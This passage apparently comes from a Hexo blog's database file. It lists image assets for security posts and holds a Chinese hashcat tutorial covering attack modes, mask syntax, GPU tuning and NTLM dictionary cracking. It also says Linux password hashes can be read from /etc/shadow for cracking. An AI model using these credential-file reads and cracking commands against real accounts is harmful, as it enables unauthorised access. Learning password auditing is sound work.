1e7f266fdae008ebf0d2af3b0ed","modified":1731772590491},{"_id":"public/2024/11/15/Ciphey的概述/2022-12-21-22-11-28-2022-09-11-19-00-55-image.png","hash":"49d730d3f653b629358dc98129eb088b549052db","modified":1731772590491},{"_id":"public/2024/11/15/Ciphey的概述/2022-12-21-22-12-14-2022-09-11-10-26-47-image.png","hash":"f526c847be503e07b6e5db63ec49b22469086891","modified":1731772590491},{"_id":"public/2024/11/15/Ciphey的概述/2022-12-21-22-12-39-2022-09-11-10-24-43-image.png","hash":"e125289e3384b1ddd29550a3888f679877f1f968","modified":1731772590491},{"_id":"public/2024/11/15/Ciphey的概述/2022-12-21-22-12-59-2022-09-11-10-38-39-image.png","hash":"d1f9170ec937534f832f316d65d28ab77ed19897","modified":1731772590491},{"_id":"public/2024/11/15/Ciphey的概述/2022-12-25-20-07-09-2022-12-25-19-35-44-image.png","hash":"724942270f689231c47dee6ac519ae9b400c386f","modified":1731772590491},{"_id":"public/2024/11/15/Ciphey的概述/2022-12-25-20-09-20-2022-12-25-19-58-59-image.png","hash":"da7e14b1ff3793412c22849b538caa676e0f066f","modified":1731772590491},{"_id":"public/2024/11/14/hexo图片显示问题并不难/2024-11-14-23-40-00-image.png","hash":"59f7faf65c71320e7c4005f3c440c59da6358a8c","modified":1731772590491},{"_id":"public/2024/11/14/hexo图片显示问题并不难/2024-11-14-23-43-59-image.png","hash":"e367d7fa80002ee771b0a1365edf71488f219a7e","modified":1731772590491},{"_id":"public/2024/11/15/john工具破解密码/2022-12-21-13-04-05-2022-09-04-11-49-56-image.png","hash":"c9ea0a31311e4e87b7bd587e88a55abfebc185d9","modified":1731772590491},{"_id":"public/2024/11/15/john工具破解密码/2022-12-21-13-03-23-2022-09-04-11-19-05-2442110-20220324092722184-817063347.png","hash":"159b51a6fe98f5303d370463bd4b514935043657","modified":1731772590491},{"_id":"public/2024/11/15/wireshark-跟踪数据流/2022-12-21-12-59-47-2022-09-13-23-49-12-image.png","hash":"b55e14fcd215a39fcec0d0967acfd8f6e789c721","modified":1731772590491},{"_id":"public/2024/11/15/metasploit渗透测试入门/2022-12-19-23-16-30-2022-09-02-00-48-50-image.png","hash":"225e945f9d42c6270cc869a0e8121ddd7c1de10d","modified":1731772590491},{"_id":"public/2024/11/15/metasploit渗透测试入门/2022-12-19-23-23-31-2022-09-02-00-50-21-image.png","hash":"a1f22002ca5836bbad3ee19a6c25f42c26ac5962","modified":1731772590491},{"_id":"public/2024/11/15/metasploit渗透测试入门/2022-12-19-23-27-06-2022-09-01-22-43-22-image.png","hash":"856e2e3e7a9006da24d2258f7a6e583968d8309b","modified":1731772590491},{"_id":"public/2024/11/15/metasploit渗透测试入门/2022-12-19-23-34-32-2022-09-01-23-50-03-image.png","hash":"42fcff7a1c03fcd18e0c231d335da530635d7858","modified":1731772590491},{"_id":"public/2024/11/15/metasploit渗透测试入门/2022-12-19-23-35-54-2022-09-01-23-54-46-image.png","hash":"ae5a02c7c98b6317b8595cf2e847e748e6acce02","modified":1731772590491},{"_id":"public/2024/11/15/metasploit渗透测试入门/2022-12-19-23-36-36-2022-09-02-00-59-44-image.png","hash":"58ac451a582710844d581f6421da07fc3d173086","modified":1731772590491},{"_id":"public/2024/11/15/metasploit渗透测试入门/2022-12-19-23-42-07-2022-09-04-14-04-52-4a7c489874d84f32945ef3c482775e4a.png","hash":"45d72d3bcdfb1ed9c777a0d5d21519b1c855695e","modified":1731772590491},{"_id":"public/2024/11/15/metasploit渗透测试入门/2022-12-19-23-42-31-2022-09-04-14-05-09-c36dfd8283d74339a4753809a609c9dd.png","hash":"adcafcc1608b73c5e6f7030678de02aac582e404","modified":1731772590491},{"_id":"public/2024/11/15/metasploit渗透测试入门/2ace2cb635e639587e21a850f0b364cf76eef144.png","hash":"a1f22002ca5836bbad3ee19a6c25f42c26ac5962","modified":1731772590491},{"_id":"public/2024/11/15/metasploit渗透测试入门/4d4f742c5f19cef39b952324c9c120b4a61ed63c.png","hash":"58ac451a582710844d581f6421da07fc3d173086","modified":1731772590491},{"_id":"public/2024/11/15/metasploit渗透测试入门/6fe033baccfc41288ad6d787c56426f8b75705e9.png","hash":"42fcff7a1c03fcd18e0c231d335da530635d7858","modified":1731772590491},{"_id":"public/2024/11/15/metasploit渗透测试入门/a407b4cba8e4b90ee8e7fd7d59b2d52996bf8f22.png","hash":"225e945f9d42c6270cc869a0e8121ddd7c1de10d","modified":1731772590491},{"_id":"public/2024/11/15/metasploit渗透测试入门/dd1b7a71f912663ff9bcc131969d1409525cce78.png","hash":"ae5a02c7c98b6317b8595cf2e847e748e6acce02","modified":1731772590491},{"_id":"public/2024/11/15/metasploit渗透测试入门/f65b3dca8ecb31a23577e4e6ba6962faa3e87ee9.png","hash":"856e2e3e7a9006da24d2258f7a6e583968d8309b","modified":1731772590491},{"_id":"public/2024/11/15/metasploit渗透测试入门/fec279cd0cec3e3ebd0f93b1ffb8ee97ad616631.png","hash":"45d72d3bcdfb1ed9c777a0d5d21519b1c855695e","modified":1731772590491},{"_id":"public/2024/11/15/密码学家的数学_模mod运算/45f02930021cca2a24e7b374f0bd5aceb436734a.png","hash":"cde939abc521cc9ddd1a3f9925f30fa764fb5077","modified":1731772590491},{"_id":"public/2024/11/15/一个经典的公司财务报表分析案例/2022-12-21-22-54-11-2022-08-21-17-05-59-image.png","hash":"d36a798cccccbbb42763d77db09e887c77935da4","modified":1731772590491},{"_id":"public/2024/11/15/重建引导/2022-11-25-16-50-50-image.png","hash":"7cb3669f70ceec9b1364618c680fc7dda81bac47","modified":1731772590491},{"_id":"public/2024/11/15/重建引导/2022-11-25-16-51-46-image.png","hash":"d2a84f0b2b43b8e61c81581bd07ccc10a525847c","modified":1731772590491},{"_id":"public/2024/11/15/重建引导/2022-11-25-16-52-20-image.png","hash":"e345c374a3b8b5e60ca5aae65cef4cc1647bae8e","modified":1731772590491},{"_id":"public/2024/11/15/重建引导/2022-11-25-16-52-55-image.png","hash":"03e68135451e7ee880926ada7cf86fb567e40725","modified":1731772590491},{"_id":"public/2024/11/15/重建引导/2022-11-25-16-53-25-image.png","hash":"3679a7a73a515100c213dce549d15146c7b50da5","modified":1731772590491},{"_id":"public/2024/11/15/重建引导/2022-11-25-16-57-23-image.png","hash":"65da3d6d5dd0c1f48a868d747db687c67c087bb9","modified":1731772590491},{"_id":"public/2024/11/15/重建引导/2022-12-21-00-20-34-2022-11-25-16-49-20-image.png","hash":"cdd1cf5a3ce657a482fb11b0b2ccacb73f37a1bb","modified":1731772590491},{"_id":"public/2024/11/15/重建引导/2022-12-21-00-21-00-2022-11-25-16-50-13-image.png","hash":"7ba3d196556ce3bdb7359576f61cb94db4a9938a","modified":1731772590491},{"_id":"public/fonts/README.html","hash":"3b9daaf126709e3bbce5926e15d599f1fe877921","modified":1731772590491},{"_id":"public/js/application.js","hash":"46d1fb207ce5f0acb83803f927985dfcea86f9ef","modified":1731772590491},{"_id":"public/js/application.min.js","hash":"34d765e982c7d6360c37f82202d99f63ac40e408","modified":1731772590491},{"_id":"public/js/insight.js","hash":"298e8ca42517984bd26f34caa4c45560b0e909ad","modified":1731772590491},{"_id":"public/css/style.min.css","hash":"1d23abc76726ebe042f7df4749f00f8f73338444","modified":1731772590491},{"_id":"public/css/style.css","hash":"a115348d8810a8d6b608ffc7bb02b915b3f48534","modified":1731772590491},{"_id":"public/js/jquery.min.js","hash":"5a9dcfbef655a2668e78baebeaa8dc6f41d8dabb","modified":1731772590491},{"_id":"public/js/plugin.min.js","hash":"07fe34638f9832702c5f81d8583c5e4e8b3d9659","modified":1731772590491},{"_id":"public/js/plugin.js","hash":"a8524d42b8621bfaa06602a163c6a1f82702b91d","modified":1731772590491},{"_id":"public/fonts/iconfont.svg","hash":"25929e6e74f7027acd1f6467a67e95b153bcd8d5","modified":1731772590491},{"_id":"public/js/plugin.js.map","hash":"1730c0cc660f863120aca0a439d7264e2e245fc5","modified":1731772590491},{"_id":"public/2024/11/15/Hashcat使用教程/2022-12-21-15-20-41-2022-09-04-13-31-26-image.png","hash":"3970670864590069d3463b681b761cbe7e4c3595","modified":1731772590491},{"_id":"public/2024/11/15/CTF-图片隐写那些事儿/2022-11-28-00-12-09-image.png","hash":"2dcc91ebe5087290963003d46e041007c546d4e9","modified":1731772590491},{"_id":"public/2024/11/15/CTF-图片隐写那些事儿/2022-11-28-00-12-59-image.png","hash":"5de6244b1e52a44abf7ddc8880a1e2a9970f0059","modified":1731772590491},{"_id":"public/2024/11/15/CTF-图片隐写那些事儿/2022-11-28-00-20-05-image.png","hash":"1faa9f7750dcf1288544d17c33a3f81212a0f4fd","modified":1731772590491},{"_id":"public/2024/11/15/CTF-图片隐写那些事儿/2022-11-28-01-49-16-image.png","hash":"23f1177976bb8aa13474f7896071f4adfb0b05fb","modified":1731772590491},{"_id":"public/2024/11/15/CTF-图片隐写那些事儿/2022-11-28-01-55-28-image.png","hash":"c9baefa38717e41ca782ceee12bf655bc0862bc0","modified":1731772590491},{"_id":"public/2024/11/15/CTF-图片隐写那些事儿/2022-11-28-01-55-46-image.png","hash":"f38f0334f96d38c65b5fb7638db8295695140f21","modified":1731772590491},{"_id":"public/2024/11/15/CTF-图片隐写那些事儿/2022-11-28-01-56-16-image.png","hash":"d2fd5ce5ca88f6446711696b8ac2975ac3cf74ec","modified":1731772590491},{"_id":"public/2024/11/14/hexo图片显示问题并不难/2024-11-14-23-19-21-image.png","hash":"fcd9ec45045617b66a4aa44d3c7463c8bfcdda76","modified":1731772590491},{"_id":"public/2024/11/15/john工具破解密码/2022-12-21-13-01-13-2022-09-04-12-52-42-image.png","hash":"4f1af247e19925e88fd6f7410b83f196463d9564","modified":1731772590491},{"_id":"public/2024/11/15/john工具破解密码/2022-12-21-13-06-13-2022-09-04-13-00-45-image.png","hash":"6ef144f08cf6ceb3c8f096e8773dc906f5ea3fd4","modified":1731772590491},{"_id":"public/2024/11/15/wireshark-跟踪数据流/2022-12-21-12-58-41-2022-09-13-23-43-43-image.png","hash":"0f7e8e11ce6cac95b885df1a82da8d4ecc0912ed","modified":1731772590491},{"_id":"public/2024/11/15/wireshark-跟踪数据流/2022-12-21-12-59-14-2022-09-13-23-44-29-image.png","hash":"67063af5aa34820c81f51bf897085f70d782a445","modified":1731772590491},{"_id":"public/2024/11/15/metasploit渗透测试入门/2022-12-19-23-04-18-2022-09-01-22-24-29-e7ef1388784f4ba5a7b283238a61ee4a.png","hash":"bbc645a46f0f754424ae19e04f7163b4b2ecd479","modified":1731772590491},{"_id":"public/2024/11/15/metasploit渗透测试入门/2022-12-19-23-17-29-2022-09-02-00-52-40-image.png","hash":"662ab7a4bb01f8af1065bf1b404ed5aea0400171","modified":1731772590491},{"_id":"public/2024/11/15/metasploit渗透测试入门/2022-12-19-23-30-30-2022-09-01-23-07-51-image.png","hash":"36d82ae44fc0d525f7e14197977e96c1ae4c84c0","modified":1731772590491},{"_id":"public/2024/11/15/metasploit渗透测试入门/2022-12-19-23-40-41-2022-09-04-14-04-03-0b2e72e9be89472283e87d3c0d996565.png","hash":"2c63a4a35d28d78dc0025983bcf4f4246b618bb6","modified":1731772590491},{"_id":"public/2024/11/15/metasploit渗透测试入门/2a26300befbffa17c2ba8ecadb69c3c8b45991d0.png","hash":"662ab7a4bb01f8af1065bf1b404ed5aea0400171","modified":1731772590491},{"_id":"public/2024/11/15/metasploit渗透测试入门/4bc0ab674fd9e7529eb6ac5d7538693e1c0dd92a.png","hash":"36d82ae44fc0d525f7e14197977e96c1ae4c84c0","modified":1731772590491},{"_id":"public/2024/11/15/metasploit渗透测试入门/5a10b2b436d19787fabe4a53785605bf3e48d9d0.png","hash":"bbc645a46f0f754424ae19e04f7163b4b2ecd479","modified":1731772590491},{"_id":"public/2024/11/15/metasploit渗透测试入门/7976c0056e23f81c48a5e58c3c590d627a882e33.png","hash":"2c63a4a35d28d78dc0025983bcf4f4246b618bb6","modified":1731772590491},{"_id":"public/2024/11/15/密码学家的数学_模mod运算/c1195a9510556da159632802ad710b46096747c1.png","hash":"ab7ec1a49f54324a62715306c0845d782457c36a","modified":1731772590491},{"_id":"public/2024/11/15/Ciphey的概述/2022-12-21-22-13-33-2022-09-11-10-46-23-image.png","hash":"60e2a1433148bfa922ff1cc1fa41409bdda64b13","modified":1731772590491},{"_id":"public/2024/11/14/hexo图片显示问题并不难/2024-11-14-23-55-19-image.png","hash":"cbbe986fd0df13fa67728939e70cccb47c24ecd7","modified":1731772590491},{"_id":"public/2024/11/15/john工具破解密码/2022-12-21-13-05-33-2022-09-04-14-05-52-2442110-20220324093335099-1014764646.png","hash":"3866f04be664d19bd127952b915c06c611533ae2","modified":1731772590491},{"_id":"public/2024/11/15/metasploit渗透测试入门/0d1cb80ec5a6b930880952b22bcafd244716b33d.png","hash":"8ed429c0ce8a5620050f44538c0d0d95f298d6c6","modified":1731772590491},{"_id":"public/2024/11/15/metasploit渗透测试入门/2022-12-19-23-30-59-2022-09-01-23-08-59-image.png","hash":"13c0999648fc73bc4de8ce003cf0f24fc6aaff62","modified":1731772590491},{"_id":"public/2024/11/15/metasploit渗透测试入门/2022-12-19-23-41-45-2022-09-04-14-04-27-5a1d854398df41b2894cdf91ef404d12.png","hash":"8ed429c0ce8a5620050f44538c0d0d95f298d6c6","modified":1731772590491},{"_id":"public/2024/11/15/metasploit渗透测试入门/66ba7fc4908ffcfa0b7b82bc686e3820438307c5.png","hash":"13c0999648fc73bc4de8ce003cf0f24fc6aaff62","modified":1731772590491},{"_id":"public/2024/11/15/john工具破解密码/2024-11-15-21-36-47-image.png","hash":"d8ca74005eedd12d07a097f8252d86d6f4e940c0","modified":1731772590491},{"_id":"public/2024/11/15/CTF-图片隐写那些事儿/2022-11-28-01-53-19-image.png","hash":"9c48c9e429651aad8e3b09bada27b621a8c43033","modified":1731772590491},{"_id":"public/2024/11/15/metasploit渗透测试入门/2022-12-19-23-03-39-2022-09-01-22-24-08-419a26b8a94044809d175fbe5f708723.png","hash":"a8e47039406e71561efcb18d679bd852dbc415f9","modified":1731772590491},{"_id":"public/2024/11/15/metasploit渗透测试入门/3ea356c39a57d9dec55e2224d82030f1a14d03c8.png","hash":"a8e47039406e71561efcb18d679bd852dbc415f9","modified":1731772590491},{"_id":"public/2024/11/15/metasploit渗透测试入门/eda8f852311aeedff007fa3c146d4a0ccb113e3e.png","hash":"a8e47039406e71561efcb18d679bd852dbc415f9","modified":1731772590491},{"_id":"public/2024/11/15/CTF-图片隐写那些事儿/2022-11-28-01-39-52-image.png","hash":"606ade0fc633990c439ac7cd311a78cd63c4786e","modified":1731772590491},{"_id":"public/2024/11/15/CTF-图片隐写那些事儿/2022-11-27-11-50-30-image.png","hash":"f1f2696248bfd518b2475d39e9314dc6b996332c","modified":1731772590491},{"_id":"public/2024/11/15/CTF-图片隐写那些事儿/2022-11-27-11-50-30-image.png.baiduyun.downloading","hash":"b816a1d227f1b5334fca7c2abb8c8788a7d49c4d","modified":1731772590491},{"_id":"public/2024/11/15/CTF-图片隐写那些事儿/2022-11-28-01-19-48-image.png","hash":"95499e2322be73eb41e7ea775e4469a5065ab8ac","modified":1731772590491},{"_id":"public/2024/11/15/metasploit渗透测试入门/2022-12-19-23-38-59-2022-09-04-11-19-46-32135c9d149941fd9e206984e1c4b66f.gif","hash":"945b4a88cc19f3da79a936b4588f07e134638103","modified":1731772590491},{"_id":"public/2024/11/15/CTF-图片隐写那些事儿/2022-11-28-01-19-48-image.png.baiduyun.downloading","hash":"c368dfedcb78f05c3b8b09505fba83dc8dce2a7b","modified":1731772590491},{"_id":"public/2024/11/15/metasploit渗透测试入门/85a98c0d5bb71142f0e74a173b6faf1bc6d24a53.gif","hash":"945b4a88cc19f3da79a936b4588f07e134638103","modified":1731772590491},{"_id":"source/_posts/hexo真是个好东西.md","hash":"db4a63967e650a9776aa4eb81e3077a11b00e6ef","modified":1731773301399}],"Category":[{"name":"other","_id":"cm3kcor2y000d8oi47awyb955"},{"name":"web","_id":"cm3kcor30000i8oi47zt5h1g0"}],"Data":[],"Page":[{"title":"tags","date":"2024-11-15T12:46:31.000Z","_content":"","source":"tags/index.md","raw":"---\ntitle: tags\ndate: 2024-11-15 20:46:31\n---\n","updated":"2024-11-15T12:46:31.891Z","path":"tags/index.html","comments":1,"layout":"page","_id":"cm3kcor2l00008oi43z71db6x","content":"","excerpt":"","more":""},{"title":"about","date":"2024-11-13T13:39:01.000Z","_content":"\n这里是用来作自我介绍用的。\n","source":"about/index.md","raw":"---\ntitle: about\ndate: 2024-11-13 21:39:01\n---\n\n这里是用来作自我介绍用的。\n","updated":"2024-11-13T13:42:35.157Z","path":"about/index.html","comments":1,"layout":"page","_id":"cm3kcor2q00028oi4hwotanrr","content":"<p>这里是用来作自我介绍用的。</p>\n","excerpt":"","more":"<p>这里是用来作自我介绍用的。</p>\n"},{"title":"categories","date":"2024-11-15T12:45:58.000Z","_content":"","source":"categories/index.md","raw":"---\ntitle: categories\ndate: 2024-11-15 20:45:58\n---\n","updated":"2024-11-15T12:45:58.837Z","path":"categories/index.html","comments":1,"layout":"page","_id":"cm3kcor2t00058oi487ubcr11","content":"","excerpt":"","more":""}],"Post":[{"title":"Hashcat使用教程","date":"2024-11-15T13:50:13.000Z","_content":"\n## Hashcat使用教程\n\nHashcat系列有3个版本，分别是hashcat、 oclhashcat-lite和oclhashcat-plus.\n其中hashcat是利用CPU来暴力破解密码的，支持的算法是最多的，但是相比破解速度很慢。\noclhashcat-lite和oclhashcat-plus都是利用GPU来破解密码的，破解速度比利用CPU的hashcat快很多倍。\noclHashcat-plus支持使用GPU破解多个HASH，并且支持的算法高达77种。oclHashcat-lite只支持使用GPU对单个HASH进行破解，支持的HASH种类仅有32种，但是对算法进行了优化，可以达到GPU破解的最高速度。\n<mark>以上是对于windows来说的。</mark>\n\n对于想要破解一些未知长度的密码，希望软件在一定长度范围内进行尝试的，可以使用--increment参数，并且用--increment-min ? 定义最短长度，使用--increment-max ? 定义最大长度。比如要尝试6-8位小写字母，可以这样写\n\n`--increment --increment-min 6 --increment-max 8 ?l?l?l?l?l?l?l?l`\n\n不指定字符类型则是\n\n`--increment --increment-min 6 --increment-max 8`\n\nlinux系统可以通过 cat /etc/shadow 获取哈希值\n\nhashcat是一款可以基于显卡暴力破解密码的工具\n\n****-a 攻击方式****\n\n```\n0 | Straight  字典破解\n1 | Combination  组合破解\n3 | Brute-force  掩码破解\n6 | Hybrid Wordlist + Mask  混合字典 + 掩码\n7 | Hybrid Mask + Wordlist  混合掩码 + 字典\n9 | Association\n```\n\n需要注意上面的1、6和7的组合是如下描述\n\n![](Hashcat使用教程/2022-12-21-15-17-41-2022-09-03-16-15-13-image.png)\n\n-m hash加密的类型，最常用为0系MD5加密，默认是MD5类型\n\n当我们想要找一个类型在hashcat支不支持的时候，可以使用\n\n![](Hashcat使用教程/2022-12-21-15-18-20-2022-09-04-12-01-12-image.png)\n\nwindows系统加密的是NTML，可以看到NTLM的ID号为1000，则使用 -m 1000\n\n-o 将输出结果储存到指定文件  ` -o outfile.txt`\n\n-O 大写，启用优化的内核（限制密码长度）\n\n![](Hashcat使用教程/2022-12-21-15-19-21-2022-09-04-12-07-49-image.png)\n\n```\nl | abcdefghijklmnopqrstuvwxyz              纯小写字母\nu | ABCDEFGHIJKLMNOPQRSTUVWXYZ              纯大写字母\nd | 0123456789                              纯数字\nh | 0123456789abcdef                        十六进制小写字母和数字\nH | 0123456789ABCDEF                        十六进制大写字母和数字\ns |  !\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~       特殊字符\na | ?l?u?d?s                                键盘上所有可见的字符\nb | 0x00 - 0xff                             匹配密码空格\n```\n\n```\n八位数字密码：?d?d?d?d?d?d?d?d\n八位未知密码：?a?a?a?a?a?a?a?a\n前四位为大写字母，后面四位为数字：?u?u?u?u?d?d?d?d\n前四位为数字或者是小写字母，后四位为大写字母或者数字：?h?h?h?h?H?H?H?H\n前三个字符未知，中间为admin，后三位未知：?a?a?aadmin?a?a?a\n6-8位数字密码：--increment --increment-min 6 --increment-max 8 ?d?d?d?d?d?d?d?d\n6-8位数字+小写字母密码：--increment --increment-min 6 --increment-max 8 ?h?h?h?h?h?h?h?h\n```\n\n```\n--custom-charset1 [chars]等价于 -1\n--custom-charset2 [chars]等价于 -2\n--custom-charset3 [chars]等价于 -3\n--custom-charset4 [chars]等价于 -4\n```\n\n自定义掩码规则，在掩码中用 ?1、?2、?3、?4 来表示。\n\n注意：\n\n- --custom-charset1 abcd ?1?1?1?1?1 等价于 -1 abcd ?1?1?1?1?1\n- -3 abcdef -4 123456 ?3?3?3?3?4?4?4?4 表示前四位可能是 adbcdef，后四位可能是 123456\n\n当没有字典的时候，可以使用掩码指定密码的每一位是什么类型的字符，如上图，首先我们知道密码有多少位，例如:`?d?d?d?d?d`代表密码为5为数字，`?u?l?l?l?l?d?d?d123`代表密码为11位，首个字母大写，后面为123。\n\n**使用字典爆破windows hash**  \n`hashcat -a 0 -m 1000 hash或者hashfile 字典文件 --force`\n\n在破解后，会在根目录下的`~/.hashcat/hashcat.potfile`文件记录这个hash的缓存,可以删除文件里对应的记录。最好将该文件清空，方便后续破解。\n\n如上图，-D参数指定opencl的设备类型，即CPU还是GPU，虚拟机不支持GPU。GPU破解需要安装显卡对应的驱动，如果电脑有英伟达（NVIDIA RTX/GTX）的独显，可以使用CUDA加速，需要提前安装cuda，这里可以直接使用docker容器。\n\n一般使用 -D 2 指定 GPU 破解\n\n在使用GPU模式进行破解时，可以使用 -O 参数自动进行优化\n\n<mark>Hashcat 参数优化</mark>\n\n```\n--gpu-accel 160         可以让GPU发挥最大性能\n--gpu-loops 1024        可以让GPU发挥最大性能\n--segment-size 512      可以提高大字典破解的速度\n```\n\n![](Hashcat使用教程/2022-12-21-15-20-12-2022-09-04-12-32-40-image.png)\n\n在linux中，我们知道，密码分别存储在/etc/passwd和/etc/shadow中，只需要`more /etc/shadow`，将其中的文件复制出来，使用工具破解即可，Linux使用的是 sha512crypt加密方式\n\n![](Hashcat使用教程/2022-12-21-15-20-41-2022-09-04-13-31-26-image.png)\n\n![](Hashcat使用教程/2022-12-21-15-21-06-2022-09-04-13-36-40-image.png)\n\n![](Hashcat使用教程/2022-12-21-15-21-28-2022-09-04-13-37-36-image.png)\n\n<mark>基本使用方式 </mark>\n\nhashcat -m 哈希类型 -a 攻击类型 --force hash文件/字符串 字典/掩码\n\ns键查看破解进度，p键暂停，r键继续破解，q键退出破解\n","source":"_posts/Hashcat使用教程.md","raw":"---\ntitle: Hashcat使用教程\ndate: 2024-11-15 21:50:13\ntags: [crypto]\n\n---\n\n## Hashcat使用教程\n\nHashcat系列有3个版本，分别是hashcat、 oclhashcat-lite和oclhashcat-plus.\n其中hashcat是利用CPU来暴力破解密码的，支持的算法是最多的，但是相比破解速度很慢。\noclhashcat-lite和oclhashcat-plus都是利用GPU来破解密码的，破解速度比利用CPU的hashcat快很多倍。\noclHashcat-plus支持使用GPU破解多个HASH，并且支持的算法高达77种。oclHashcat-lite只支持使用GPU对单个HASH进行破解，支持的HASH种类仅有32种，但是对算法进行了优化，可以达到GPU破解的最高速度。\n<mark>以上是对于windows来说的。</mark>\n\n对于想要破解一些未知长度的密码，希望软件在一定长度范围内进行尝试的，可以使用--increment参数，并且用--increment-min ? 定义最短长度，使用--increment-max ? 定义最大长度。比如要尝试6-8位小写字母，可以这样写\n\n`--increment --increment-min 6 --increment-max 8 ?l?l?l?l?l?l?l?l`\n\n不指定字符类型则是\n\n`--increment --increment-min 6 --increment-max 8`\n\nlinux系统可以通过 cat /etc/shadow 获取哈希值\n\nhashcat是一款可以基于显卡暴力破解密码的工具\n\n****-a 攻击方式****\n\n```\n0 | Straight  字典破解\n1 | Combination  组合破解\n3 | Brute-force  掩码破解\n6 | Hybrid Wordlist + Mask  混合字典 + 掩码\n7 | Hybrid Mask + Wordlist  混合掩码 + 字典\n9 | Association\n```\n\n需要注意上面的1、6和7的组合是如下描述\n\n![](Hashcat使用教程/2022-12-21-15-17-41-2022-09-03-16-15-13-image.png)\n\n-m hash加密的类型，最常用为0系MD5加密，默认是MD5类型\n\n当我们想要找一个类型在hashcat支不支持的时候，可以使用\n\n![](Hashcat使用教程/2022-12-21-15-18-20-2022-09-04-12-01-12-image.png)\n\nwindows系统加密的是NTML，可以看到NTLM的ID号为1000，则使用 -m 1000\n\n-o 将输出结果储存到指定文件  ` -o outfile.txt`\n\n-O 大写，启用优化的内核（限制密码长度）\n\n![](Hashcat使用教程/2022-12-21-15-19-21-2022-09-04-12-07-49-image.png)\n\n```\nl | abcdefghijklmnopqrstuvwxyz              纯小写字母\nu | ABCDEFGHIJKLMNOPQRSTUVWXYZ              纯大写字母\nd | 0123456789                              纯数字\nh | 0123456789abcdef                        十六进制小写字母和数字\nH | 0123456789ABCDEF                        十六进制大写字母和数字\ns |  !\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~       特殊字符\na | ?l?u?d?s                                键盘上所有可见的字符\nb | 0x00 - 0xff                             匹配密码空格\n```\n\n```\n八位数字密码：?d?d?d?d?d?d?d?d\n八位未知密码：?a?a?a?a?a?a?a?a\n前四位为大写字母，后面四位为数字：?u?u?u?u?d?d?d?d\n前四位为数字或者是小写字母，后四位为大写字母或者数字：?h?h?h?h?H?H?H?H\n前三个字符未知，中间为admin，后三位未知：?a?a?aadmin?a?a?a\n6-8位数字密码：--increment --increment-min 6 --increment-max 8 ?d?d?d?d?d?d?d?d\n6-8位数字+小写字母密码：--increment --increment-min 6 --increment-max 8 ?h?h?h?h?h?h?h?h\n```\n\n```\n--custom-charset1 [chars]等价于 -1\n--custom-charset2 [chars]等价于 -2\n--custom-charset3 [chars]等价于 -3\n--custom-charset4 [chars]等价于 -4\n```\n\n自定义掩码规则，在掩码中用 ?1、?2、?3、?4 来表示。\n\n注意：\n\n- --custom-charset1 abcd ?1?1?1?1?1 等价于 -1 abcd ?1?1?1?1?1\n- -3 abcdef -4 123456 ?3?3?3?3?4?4?4?4 表示前四位可能是 adbcdef，后四位可能是 123456\n\n当没有字典的时候，可以使用掩码指定密码的每一位是什么类型的字符，如上图，首先我们知道密码有多少位，例如:`?d?d?d?d?d`代表密码为5为数字，`?u?l?l?l?l?d?d?d123`代表密码为11位，首个字母大写，后面为123。\n\n**使用字典爆破windows hash**  \n`hashcat -a 0 -m 1000 hash或者hashfile 字典文件 --force`\n\n在破解后，会在根目录下的`~/.hashcat/hashcat.potfile`文件记录这个hash的缓存,可以删除文件里对应的记录。最好将该文件清空，方便后续破解。\n\n如上图，-D参数指定opencl的设备类型，即CPU还是GPU，虚拟机不支持GPU。GPU破解需要安装显卡对应的驱动，如果电脑有英伟达（NVIDIA RTX/GTX）的独显，可以使用CUDA加速，需要提前安装cuda，这里可以直接使用docker容器。\n\n一般使用 -D 2 指定 GPU 破解\n\n在使用GPU模式进行破解时，可以使用 -O 参数自动进行优化\n\n<mark>Hashcat 参数优化</mark>\n\n```\n--gpu-accel 160         可以让GPU发挥最大性能\n--gpu-loops 1024        可以让GPU发挥最大性能\n--segment-size 512      可以提高大字典破解的速度\n```\n\n![](Hashcat使用教程/2022-12-21-15-20-12-2022-09-04-12-32-40-image.png)\n\n在linux中，我们知道，密码分别存储在/etc/passwd和/etc/shadow中，只需要`more /etc/shadow`，将其中的文件复制出来，使用工具破解即可，Linux使用的是 sha512crypt加密方式\n\n![](Hashcat使用教程/2022-12-21-15-20-41-2022-09-04-13-31-26-image.png)\n\n![](Hashcat使用教程/2022-12-21-15-21-06-2022-09-04-13-36-40-image.png)\n\n![](Hashcat使用教程/2022-12-21-15-21-28-2022-09-04-13-37-36-image.png)\n\n<mark>基本使用方式 </mark>\n\nhashcat -m 哈希类型 -a 攻击类型 --force hash文件/字符串 字典/掩码\n\ns键查看破解进度，p键暂停，r键继续破解，q键退出破解\n","slug":"Hashcat使用教程","published":1,"updated":"2024-11-15T14:12:40.391Z","comments":1,"layout":"post","photos":[],"_id":"cm3kcor2n00018oi4040bhr64","content":"<h2 id=\"Hashcat使用教程\"><a href=\"#Hashcat使用教程\" class=\"headerlink\" title=\"Hashcat使用教程\"></a>Hashcat使用教程</h2><p>Hashcat系列有3个版本，分别是hashcat、 oclhashcat-lite和oclhashcat-plus.<br>其中hashcat是利用CPU来暴力破解密码的，支持的算法是最多的，但是相比破解速度很慢。<br>oclhashcat-lite和oclhashcat-plus都是利用GPU来破解密码的，破解速度比利用CPU的hashcat快很多倍。<br>oclHashcat-plus支持使用GPU破解多个HASH，并且支持的算法高达77种。oclHashcat-lite只支持使用GPU对单个HASH进行破解，支持的HASH种类仅有32种，但是对算法进行了优化，可以达到GPU破解的最高速度。<br><mark>以上是对于windows来说的。</mark></p>\n<p>对于想要破解一些未知长度的密码，希望软件在一定长度范围内进行尝试的，可以使用–increment参数，并且用–increment-min ? 定义最短长度，使用–increment-max ? 定义最大长度。比如要尝试6-8位小写字母，可以这样写</p>\n<p><code>--increment --increment-min 6 --increment-max 8 ?l?l?l?l?l?l?l?l</code></p>\n<p>不指定字符类型则是</p>\n<p><code>--increment --increment-min 6 --increment-max 8</code></p>\n<p>linux系统可以通过 cat &#x2F;etc&#x2F;shadow 获取哈希值</p>\n<p>hashcat是一款可以基于显卡暴力破解密码的工具</p>\n<p><strong><strong>-a 攻击方式</strong></strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0 | Straight  字典破解</span><br><span class=\"line\">1 | Combination  组合破解</span><br><span class=\"line\">3 | Brute-force  掩码破解</span><br><span 